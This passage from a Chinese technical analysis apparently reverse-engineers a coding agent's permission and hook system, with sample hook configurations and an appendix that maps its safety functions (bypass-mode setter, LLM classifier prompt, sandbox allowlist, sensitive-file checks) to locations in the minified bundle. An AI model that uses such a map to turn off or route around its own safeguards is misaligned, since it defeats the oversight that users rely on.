    PermSystem->>Hooks: PreToolUse(Bash, "npm test")
    Hooks->>Hooks: 执行匹配的 hook 命令
    
    alt Hook 返回非零退出码
        Hooks-->>PermSystem: ❌ block (reason)
        PermSystem-->>Agent: deny
    else Hook 返回零
        Hooks-->>PermSystem: ✅ pass
        PermSystem->>Tool: 执行工具
        Tool-->>PermSystem: 结果
        PermSystem->>Hooks: PostToolUse(Bash, result)
    end
```

### 10.2 Hook 配置与 Matcher

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash(git push *)",
        "hooks": [
          { "type": "command", "command": "npm test && npm run lint" }
        ]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Edit|Write",
        "hooks": [
          { "type": "command", "command": "npx prettier --write $CLAUDE_FILE_PATH" }
        ]
      }
    ]
  }
}
```

**Matcher 语法**：
- `"Bash"` — 匹配所有 Bash 调用
- `"Bash(git push *)"` — 匹配特定命令模式
- `"Edit|Write"` — 匹配多个工具（`|` 分隔）
- 空字符串 — 匹配所有工具

**Hook 类型**：
- `type: "command"` — 执行外部命令。非零退出码 → 阻止工具执行。
- `type: "function"` — 仅限 REPL 上下文中的 Stop hooks。

### 10.3 Hook 来源的权限规则过滤

Hook 也有 `permission_rule` 属性（和规则引擎语法相同），用于限制 hook 的触发范围：

```json
{
  "matcher": "Bash",
  "permission_rule": "Bash(git *)",
  "hooks": [{ "type": "command", "command": "echo 'Git operation detected'" }]
}
```

这个 hook 只在 Bash 命令匹配 `git *` 模式时才触发。

### 10.4 权限相关的 Hook 事件

| 事件 | 触发时机 | 权限交互 |
|------|---------|---------|
| `PreToolUse` | 权限检查通过后、工具执行前 | Hook 可以 block（最后的拦截点） |
| `PostToolUse` | 工具执行成功后 | 可以做审计/格式化，不影响权限 |
| `PostToolUseFailure` | 工具执行失败后 | 可以做错误处理 |
| `PermissionRequest` | 权限提示即将展示时 | 可以自动回复（自定义审批逻辑） |

### 10.5 实现建议

> 如果你要自己实现 Hook 系统：
>
> - `PreToolUse` 是与权限交互的核心。它在规则引擎之后、实际执行之前，是用户代码介入的最后机会。
> - Hook 执行必须有超时——否则一个阻塞的 hook 会卡住整个 agent。
> - Hook 的 stdout 可以作为 feedback 注入对话（Claude Code 这样做了）。
> - 最小可行实现：只需 `PreToolUse` + `PostToolUse` + command 类型就够了。

---

## 附录A：函数名对照表

以下是本文中使用的语义化名称与 bundle 中实际函数/变量名的对照：

| 语义名称 | Bundle 名称 | 位置 | 功能 |
|---------|------------|------|------|
| `matchPathRule` | `OH()` | L471773 | 路径规则匹配（核心） |
| `safetyCheck` | `Hi6()` | L471612 | 文件写入安全检查 |
| `isInWorkingDir` | `rE()` | L471638 | 判断路径是否在工作目录内 |
| `isSubPath` | `SN()` | L471644 | 判断路径是否是另一个路径的子路径 |
| `checkBashPermission` | `wm1()` | L271998 | Bash 完整权限检查流 |
| `bashQuickDenyCheck` | `akq()` | L271949 | Bash 快速 deny 规则检查 |
| `checkReadPermission` | `mq6()` | L471798 | 文件读取权限检查 |
| `checkWritePermission` | `Uw6()` | L471878 | 文件写入权限检查 |
| `globalReadAllow` | `Xi6()` | L472048 | 全局读取允许逻辑 |
| `globalWriteAllow` | `Ji6()` | L472008 | 全局写入允许逻辑 |
| `isSensitiveFile` | `avY()` | L471578 | 敏感文件检测 |
| `isInProtectedProjectPath` | `nvY()` | L471514 | 项目保护路径检测 |
| `hasSuspiciousWindowsPath` | `vxK()` | L471601 | Windows 特殊路径检测 |
| `collectRules` | `TxK()` | L471751 | 收集指定类型/行为的所有规则 |
| `collectAllRules` | `zj6()` | L472519 | 按工具+行为收集规则（含来源） |
| `applyPermissionUpdate` | `w2()` | — | 应用单个权限更新 |
| `applyPermissionUpdates` | `Hk()` | L472283 | 批量应用权限更新 |
| `persistPermissionUpdate` | `xQ()` | L472293 | 持久化权限更新到 settings 文件 |
| `getAlwaysAllowRules` | `PR6()` | L472416 | 获取所有 allow 规则 |
| `getAlwaysDenyRules` | `JK6()` | L472467 | 获取所有 deny 规则 |
| `getAlwaysAskRules` | `WR6()` | L472475 | 获取所有 ask 规则 |
| `matchesToolName` | `nK7()` | L472483 | 工具名规则匹配 |
| `generatePermissionMessage` | `s9()` | L472424 | 生成权限提示消息 |
| `isAutoModeAllowlistedTool` | `YTY()` | L472395 | 检查工具是否在 auto-mode 安全白名单 |
| `autoModeAllowlist` | `zTY` | L472409 | Auto-mode 安全白名单 Set |
| `callLLMClassifier` | `Ny8()` | — | 调用两阶段 LLM 分类器 |
| `classifierPrompt` | `oLq` | L277879 | 分类器 system prompt |
| `calculateCost` | `Qj8()` | — | 根据模型和 usage 计算成本 USD |
| `isPathInSandboxWriteAllowlist` | `JC1()` | L222542 | 沙箱写入白名单检查 |
| `resolvePathSegments` | `sb()` | L7475 | 路径段解析（含 symlink） |
| `getWorkingDirectories` | `Tu()` | L471634 | 获取所有工作目录集合 |
| `setBypassMode` | `Ml8()` | L2608 | 设置 session bypass 模式 |
| `getBypassMode` | `r56()` | L2612 | 获取 session bypass 模式 |
| `getSettings` | `V1()` | — | 获取指定来源的设置 |
| `updateSettings` | `A7()` | — | 更新指定来源的设置 |
| `permissionModes` | `Xj8` | L104782 | 5 种经典模式列表 |
| `allPermissionModes` | `XD4` | L104782 | 6 种模式列表（含 auto） |
| `hookEventTypes` | `Bp` | L105219 | 26 种 hook 事件类型列表 |
| `ruleBehaviors` | `WD_` | L172821 | 规则行为列表 `["allow","deny","ask"]` |

> **行号对照**: 所有行号 (L*) 基于 `cli.beautified.js`（js-beautify 格式化后的 541,614 行版本）。
